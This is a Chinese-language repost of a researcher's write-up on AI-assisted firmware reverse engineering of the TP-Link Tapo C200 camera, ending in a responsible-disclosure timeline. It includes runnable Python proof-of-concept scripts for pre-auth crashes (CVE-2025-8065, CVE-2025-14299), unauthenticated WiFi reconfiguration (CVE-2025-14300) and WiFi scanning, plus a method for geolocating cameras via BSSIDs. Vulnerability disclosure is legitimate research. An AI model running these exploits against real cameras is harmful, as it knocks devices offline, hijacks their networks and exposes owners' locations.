#  AI 辅助逆向之旅：如何从TP-Link摄像头中挖掘漏洞  
原创 骨哥说事
                    骨哥说事  骨哥说事   2026-01-19 02:35  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/5178  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
欢迎阅读由一位国外网络安全研究员撰写的2025年度的最后一篇文章。每当有人向其请教如何开始学习逆向工程时，这位研究者总是给出同样的建议：购买能找得到的最便宜的 IP 摄像头，这些设备是自成体系的小型生态系统——拥有可以提取的固件、可以嗅探的网络协议，以及可以反编译的移动应用程序。  
  
你有很大可能找到一些有趣的东西。最坏的情况，能学到很多关于汇编和嵌入式系统的知识。最好的情况是能发现一些高危漏洞，甚至可能学会如何利用它！  
  
![tp-link tapo c200](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jn6lE9kJyJfzYkg9p1DSLm1YubLKQXzCBjAIIQD0Nc8qaQiaHVeMLy7MGG6biaFiaSU5us8YYl6s48Bg/640?wx_fmt=jpeg&from=appmsg "")  
  
这位研究者自己也拥有几台 TP-Link Tapo C200 摄像头。这些摄像头价格便宜（在意大利用不了 20 欧元），出奇地稳定，并且研究者真心觉得它们很好用。  
  
某个周末，研究者决定只是为了实践这个建议，开启了一场探索。Tapo C200 面市已有一段时间，并且多年来已经发现或多或少修补了  
几个 CVE[1]  
，因此研究者最初没期望在最新固件中发现太多问题。不过想借此机会进行一些 **AI 辅助的逆向工程**  
，并测试是否仍能找到任何有价值的信息。  
  
研究者全程在   
Arcadia[2]  
 上实时记录了整个过程——包括思考过程、遇到的死胡同、有效的 AI 提示以及无效的提示。如果读者想要包含截图和崩溃视频的原始、未经过滤版本，可以去那里查看。  
  
本文是该探索旅程的精简版本，旨在展示在当前拥有 AI 辅助的时代，研究者如何进行固件分析。读者会注意到，在一些情况下，研究者表现得特别“懒惰”，将一些本可以手动完成、或经过更多研究后自行推断出来的工作交给了 AI 去处理。  
  
但这也是一个整合和记录人工智能如何有效用于安全研究和逆向工程的实验，特别是让经验不足/经验丰富的研究人员/攻击者可以使用它们。  
  
故事始于一个慵懒周末项目的探索，最终发现了几个安全问题，影响约   
25,000 台直接暴露在互联网上的此类设备[3]  
。  
  
  
tapo c200 devices map  
## 获取固件  
### 使用的工具  
- 老朋友   
JD-GUI[4]  
，用于反编译 Android 应用以了解概况。  
  
- AWS CLI[5]  
，用于下载固件映像。  
  
- binwalk[6]  
，用于固件检查。  
  
- Grok[7]  
，借助 AI 快速浏览先前的研究。  
  
第一步总是获取固件二进制文件，而这次异常简单。在对   
Tapo Android 应用[8]  
进行一些  
基本逆向[9]  
后，研究者发现 TP-Link 将整个固件仓库放在了一个开放的 S3 存储桶里，无需任何认证。因此，可以列出并下载他们曾为任何设备发布的每个版本的固件：  
```
$ aws s3 ls s3://download.tplinkcloud.com/ --no-sign-request --recursive
```  
  
完整输出在此，供好奇者查看[10]  
。这提供了访问每个 TP-Link 设备固件映像的权限——包括路由器、摄像头、智能插头等。可以说这是一个逆向工程师的糖果店。  
  
成功获取了 C200（硬件版本 3）的 **1.4.2 Build 250313 Rel.40499n**  
 版本，文件名为 Tapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin  
，并开始探索。然而，首次尝试通过 binwalk 识别其格式并未成功，这表明可能存在某种加密或混淆。  
  
研究者使用 Grok   
进行了一些深入研究[11]  
，了解如何解密这些摄像头的固件。既然知道此前有其他黑客研究过，研究者就将搜索数百个相关网页的工作交给了 AI：  
  
![grok](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jn6lE9kJyJfzYkg9p1DSLm1icagjw7VPJ9BEqELCxxEcKwVmECtzcBHqKVHZJznVpJQXuDLrWFGE3g/640?wx_fmt=png&from=appmsg "")  
  
grok  
### 解密固件  
### 使用的工具  
- tp-link-decrypt[12]  
 工具，用于解密固件映像。  
  
- binwalk[13]  
，用于固件检查。  
  
多亏了 Grok、  
tp-link-decrypt[14]  
 工具，以及每个设备的每个固件映像似乎都以完全相同的方式加密这个事实，现在可以解密固件了。该工具从 TP-Link 自己的 GPL 代码发布中提取 RSA 密钥——他们作为其开源义务的一部分，自己公开了解密密钥。  
  
在此感谢 @watchfulip 的  
原始深入的 TP-Link 固件研究[15]  
 和 @tangrs   
发现相关二进制文件发布在 TP-Link GPL 代码转储中以及如何从中提取密钥[16]  
。  
```
$ git clone https://github.com/robbins/tp-link-decrypt$ cd tp-link-decrypt$ ./preinstall.sh        # 安装依赖项$ ./extract_keys.sh      # 从 TP-Link 的 GPL 代码中提取 RSA 密钥$ make$ bin/tp-link-decrypt Tapo_C200_firmware.bin
```  
  
解密后，固件显示出一个相当标准的结构：一个引导加载程序、一个内核和一个 SquashFS 根文件系统。  
```
$ binwalk -e Tapo_C200_v3_1.4.2_decrypted.bin
```  
  
![binwalk](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jn6lE9kJyJfzYkg9p1DSLm1fzhWeolGDADSubic2BBb2wWPRGibZlnqp8iaMzanFGrbZbQmoqSIYvZIA/640?wx_fmt=jpeg&from=appmsg "")  
  
binwalk  
## 漏洞挖掘  
### 使用的工具  
- Ghidra[17]  
，用于反编译和理解 MIPS 二进制文件。  
  
- GhidraMCP[18]  
，让 AI 连接到正在运行的 Ghidra 实例并在过程中提供辅助。  
  
- Cline[19]  
，请求 AI 探索文件系统并寻找有趣的组件。  
  
- Anthropic's Opus and Sonnet 4[20]  
 的混合使用。  
  
解压后，研究者使用 AI 和 Cline 探索文件系统，寻找之前反编译 Android 应用时发现的控制发现协议、摄像头网络 API、视频流等组件。  
  
加载 Ghidra 并快速查看 tp_manage  
 二进制文件后，发现了第一个有趣的东西：  
  
![tp_manage](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jn6lE9kJyJfzYkg9p1DSLm1c7sVDDqRmu7lLMYMe5DUld2FUbmITp7iac7icsBBOFvdTibicicmgLmdpNg/640?wx_fmt=other&from=appmsg "")  
  
tp_manage  
  
这个私钥不是在启动时生成的。类似于   
C500 的 CVE-2025-1099[21]  
，C200 在其固件中嵌入了为几个 API 提供 SSL 服务的私钥。如果与摄像头在同一个网络上，攻击者可以通过从固件映像中提取的密钥进行中间人攻击并解密其 HTTPS 流量，而无需接触硬件。对于一个流式传输用户家庭视频的 安全  
 摄像头来说，这存在明显安全隐患。  
  
继续加载其它有趣的二进制文件，并使用 AI 在 Ghidra 中快速探索它们，以了解其主要功能和攻击者可能的入口点。  
  
**要求 AI 解释一个函数**  
 及其与其他函数的关系，被证明对于理解加密/混淆例程和网络协议处理程序非常有用。这使研究者能从原始的、难以理解的代码：  
  
![decompiled](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jn6lE9kJyJfzYkg9p1DSLm1ib5LIZia18hQat0IDRLcy5KncPQOJDLXwELAXG16CEP5FZUe60dZ3S5A/640?wx_fmt=other&from=appmsg "")  
  
decompiled  
  
转化为 AI 可以提供的高层次理解：  
  
  
udp crc  
  
研究者发现的另一个特别有效的技术是，要求 AI 分析一个感兴趣的函数，并**根据上下文将其变量和参数重命名为有意义的名称**  
。然后对其调用的函数进行同样的操作，递归地跟踪感兴趣的分支。经过几次迭代，从 FUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3)  
 开始的东西变成了 handleConnectAp(connection *conn, int flags, json *params)  
。突然间，反编译的代码读起来几乎像原始源代码。  
  
这种迭代改进的方法，被认为是人与 AI 协同工作的一个绝佳例子，因为单独任何一方都不会如此高效，也是研究者如何映射大多数 HTTP 处理程序、发现协议等的过程。以下是研究结果的概要。关于过程的更多细节，请参考   
原始的 Discord 主题[22]  
。  
  
附带一提，研究者没有（过多地）调查以下漏洞的可利用性以实现代码执行，主要是因为不熟悉 MIPS，而且这不是本次探索的本意。  
  
然而，由于固件中存在 /bin/gdbserver 二进制文件，一旦通过物理访问获得 shell  
通过物理访问获得 shell[23]  
，就可以相对轻松地完成此操作。  
## 漏洞 1：认证前 ONVIF SOAP XML 解析器内存溢出 (CVE-2025-8065)  
  
Tapo C200 通过监听端口 2020 的 /bin/main  
 服务器暴露 ONVIF 服务，以实现与标准视频管理系统的互操作性。问题在于它解析 SOAP XML 请求的方式。  
  
处理 XML 元素时，解析器（位于 0x0045ae8c  
 的 soap_parse_and_validate_request  
）调用 ds_parse  
，而对元素数量或总内存分配没有任何边界检查。发送足够多的 XML 元素，就会导致分配的内存溢出。  
  
以下是 PoC：  
```
#!/usr/bin/env python3import urllib.requestimport sysTARGET = sys.argv[1]ONVIF_PORT = 2020# 生成 100,000 个 XML 元素 - 这将溢出解析器params = ''.join([f'<SimpleItem Name="Param{i}" Value="{"X" * 100}"/>'                  for i in range(100000)])body = f'''<?xml version="1.0" encoding="UTF-8"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><CreateRules xmlns="http://www.onvif.org/ver20/analytics/wsdl"><ConfigurationToken>test</ConfigurationToken><Rule><Name>TestRule</Name><Type>tt:CellMotionDetector</Type><Parameters>{params}</Parameters></Rule></CreateRules></soap:Body></soap:Envelope>'''req = urllib.request.Request(f"http://{TARGET}:{ONVIF_PORT}/onvif/service",                             data=body.encode('utf-8'))req.add_header('Content-Type', 'application/soap+xml')urllib.request.urlopen(req, timeout=30)
```  
  
发送这个Payload后，摄像头会崩溃，需要断电重启才能恢复。  
  
获得CVE编号：CVE-2025-8065[24]  
## 漏洞 2：认证前 HTTPS Content-Length 整数溢出 (CVE-2025-14299)  
  
运行在端口 443 上的 HTTPS 服务器例程在其 Content-Length  
 请求头解析中存在一个经典的整数溢出漏洞。位于 0x004bd054  
 的易受攻击函数执行以下操作：  
```
iVar1 = atoi(value);param_1->content_length = iVar1;
```  
  
就这些。没有边界检查。没有验证。只是对用户输入的原始 atoi()  
 调用。  
  
在 32 位系统上，atoi("4294967295")  
 会导致整数溢出，从而引发未定义行为。在这种情况下，摄像头会崩溃：  
```
#!/usr/bin/env python3import socketimport sslimport sysTARGET = sys.argv[1]request = f"""POST / HTTP/1.1\rHost: {TARGET}\rContent-Length: 4294967295\rContent-Type: application/octet-stream\rConnection: close\r\rAAAA"""context = ssl.create_default_context()context.check_hostname = Falsecontext.verify_mode = ssl.CERT_NONEsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)ssl_sock = context.wrap_socket(sock, server_hostname=TARGET)ssl_sock.connect((TARGET, 443))ssl_sock.send(request.encode())
```  
  
这导致了又一次服务崩溃。  
CVE-2025-14299[25]  
## 漏洞 3：认证前 WiFi 劫持 (CVE-2025-14300)  
  
摄像头暴露了一个名为 connectAp  
 的 API 端点，用于在初始设置期间配置 WiFi。问题在于，它**无需任何身份验证**  
即可访问。即使在摄像头完全设置好并连接到网络之后。  
  
位于 0x0042eb7c  
 的易受攻击处理程序在处理请求时没有任何身份验证检查：  
```
void connectApHandler(undefined2 *param_1,undefined4 param_2,int json_params){    // 此处没有身份验证检查 - 直接处理请求    jso_add_string(iVar3,"method","connectAp");    jso_obj_add(iVar3,"params",iVar2);    iVar1 = ds_tapo_handle(param_1);}
```  
  
利用过程很简单：  
```
#!/usr/bin/env python3import urllib.requestimport sslimport sysTARGET = sys.argv[1]# 无需认证 - 直接发送payload = '{"method":"connectAp","params":{"onboarding":{"connect":{"ssid":"EVIL_NETWORK","bssid":"11:11:11:11:11:11","auth":3,"encryption":2,"rssi":3,"password":"hacked","pwd_encrypted":0}}}}'context = ssl.create_default_context()context.check_hostname = Falsecontext.verify_mode = ssl.CERT_NONEreq = urllib.request.Request(f"https://{TARGET}/", data=payload.encode('utf-8'))req.add_header('Content-Type', 'application/json')urllib.request.urlopen(req, context=context, timeout=10)
```  
  
这使得远程攻击者可以：  
- **断开摄像头**  
与其合法网络的连接（拒绝服务攻击）  
  
若攻击者在WiFi信号可及范围内：  
- **迫使其连接到攻击者控制的网络**  
（中间人攻击）  
  
- 一旦接入恶意网络，便可**拦截所有视频流量**  
（虽然如前所述，由于所有设备共享同一个HTTPS私钥，攻击者可能并不真的需要这个前提 XD）  
  
- **维持持久访问**  
，即使用户更改了其WiFi密码  
  
获得CVE编号：  
CVE-2025-14300[26]  
## 漏洞 4：认证前扫描附近 WiFi 网络  
  
与漏洞 3 相关，scanApList  
 方法也无需身份验证即可访问——即使设备不处于配网模式。此端点返回摄像头可见的所有 WiFi 网络列表：  
```
#!/usr/bin/env python3import urllib.requestimport sslimport sysTARGET = sys.argv[1]payload = '{"method":"scanApList","params":{}}'context = ssl.create_default_context()context.check_hostname = Falsecontext.verify_mode = ssl.CERT_NONEreq = urllib.request.Request(f"https://{TARGET}/", data=payload.encode('utf-8'))req.add_header('Content-Type', 'application/json')response = urllib.request.urlopen(req, context=context, timeout=10)print(response.read().decode())
```  
  
对暴露在互联网上的一台设备的测试结果：  
  
  
考虑到暴露在互联网上的这些设备的数量，这一点尤其令人担忧。攻击者可以远程枚举摄像头附近的 WiFi 网络，包括：  
- 附近网络的 **SSID**  
  
- **BSSID**  
（接入点的 MAC 地址）  
  
- **信号强度**  
（可用于三角定位）  
  
- **安全配置**  
  
更糟糕的是：像   
apple_bssid_locator[27]  
 这样的工具可以使用 BSSID 查询 Apple 的位置服务 API 并返回精确的 GPS 坐标。  
  
这意味着攻击者可以：  
1. 通过 ZoomEye、Shodan 或类似索引找到暴露的 Tapo 摄像头。  
  
1. 使用 scanApList  
 检索附近的 WiFi BSSID。  
  
1. 使用这些 BSSID 查询 Apple 的位置数据库。  
  
1. **将摄像头的物理位置精确定位到几米范围内。**  
  
远程攻击者不仅可以查看摄像头周围存在哪些 WiFi 网络，还可以精确确定该摄像头（以及因此它所监控的家庭或企业）在地图上的具体位置。  
## 披露  
  
研究者决定遵循  
行业标准[28]  
的 **90+30 天**  
负责任披露流程；以下是时间线：  
- **2025 年 7 月 22 日**  
：研究者向 TP-Link 安全团队（  
security@tp-link.com[29]  
）发送了包含完整技术细节、PoC 利用代码和视频的初步报告。所有内容均按照  
他们的指南[30]  
编制。  
  
- **2025 年 7 月 22 日**  
：收到确认回执。  
  
- **2025 年 8 月 22 日**  
：TP-Link 确认仍在审阅报告。  
  
- **2025 年 9 月 27 日**  
：TP-Link 做出回应，并将修复补丁的时间表设定在 2025 年 11 月底。  
  
- **2025 年 11 月**  
：没有任何进展。  
  
- **2025 年 12 月 1 日**  
：发送跟进邮件，无回复。  
  
- **2025 年 12 月 4 日**  
：发送另一封跟进邮件，TP-Link 回复说，将补丁进一步推迟到下周。  
  
- **接下来的那周**  
：没有任何进展。  
  
- **2025 年 12 月 19 日**  
：研究者在**等待 150 天后**  
进行公开披露。  
  
- **2025 年 12 月 20 日**  
：TP-Link 终于发布了针对 CVE-2025-8065、CVE-2025-14299 和 CVE-2025-14300 的安全公告。  
  
90+30 天的期限早已过去，因此研究者决定发布这篇报告。  
  
原文：https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/  
### 参考资料  
  
[1]   
几个 CVE: https://www.cvedetails.com/vulnerability-list/vendor_id-11936/product_id-83493/Tp-link-Tapo-C200-Firmware.html  
  
[2]   
Arcadia: https://discord.com/channels/1100085665766572142/1396102661257957396  
  
[3]   
25,000 台直接暴露在互联网上的此类设备: https://www.zoomeye.ai/searchResult?q=IlRQUkktREVWSUNFIg==  
  
[4]   
JD-GUI: https://java-decompiler.github.io/  
  
[5]   
AWS CLI: https://aws.amazon.com/cli/  
  
[6]   
binwalk: https://github.com/ReFirmLabs/binwalk  
  
[7]   
Grok: https://grok.com/  
  
[8]   
Tapo Android 应用: https://play.google.com/store/apps/details?id=com.tplink.iot&hl=it  
  
[9]   
基本逆向: https://www.evilsocket.net/2017/04/27/Android-Applications-Reversing-101/  
  
[10]   
完整输出在此，供好奇者查看: https://www.evilsocket.net/images/2025/tapo/bucket_contents.txt  
  
[11]   
进行了一些深入研究: https://x.com/i/grok/share/t9RzvgCRwIluVGnXMu39VVxDx  
  
[12]   
tp-link-decrypt: https://github.com/robbins/tp-link-decrypt  
  
[13]   
binwalk: https://github.com/ReFirmLabs/binwalk  
  
[14]   
tp-link-decrypt: https://github.com/robbins/tp-link-decrypt  
  
[15]   
原始深入的 TP-Link 固件研究: https://watchfulip.github.io/28-12-24/tp-link_c210_v2.html  
  
[16]   
发现相关二进制文件发布在 TP-Link GPL 代码转储中以及如何从中提取密钥: https://blog.tangrs.id.au/2025/09/22/decrypting-tplink-smart-switch-firmware/  
  
[17]   
Ghidra: https://github.com/NationalSecurityAgency/ghidra  
  
[18]   
GhidraMCP: https://github.com/LaurieWired/GhidraMCP  
  
[19]   
Cline: https://github.com/cline/cline  
  
[20]   
Anthropic's Opus and Sonnet 4: https://claude.ai/  
  
[21]   
C500 的 CVE-2025-1099: https://nvd.nist.gov/vuln/detail/CVE-2025-1099  
  
[22]   
原始的 Discord 主题: https://discord.com/channels/1100085665766572142/1396102661257957396  
  
[23]   
通过物理访问获得 shell: https://www.hacefresko.com/posts/tp-link-tapo-c200-unauthenticated-rce  
  
[24]   
CVE-2025-8065: https://nvd.nist.gov/vuln/detail/CVE-2025-8065  
  
[25]   
CVE-2025-14299: https://nvd.nist.gov/vuln/detail/CVE-2025-14299  
  
[26]   
CVE-2025-14300: https://nvd.nist.gov/vuln/detail/CVE-2025-14300  
  
[27]   
apple_bssid_locator: https://github.com/darkosancanin/apple_bssid_locator  
  
[28]   
行业标准: https://projectzero.google/vulnerability-disclosure-policy.html  
  
[29]   
security@tp-link.com: mailto:security@tp-link.com  
  
[30]   
他们的指南: https://www.tp-link.com/en/press/security-advisory/  
  
- END -  
  
**感谢阅读，如果觉得还不错的话，动动手指一键三连～**  
  
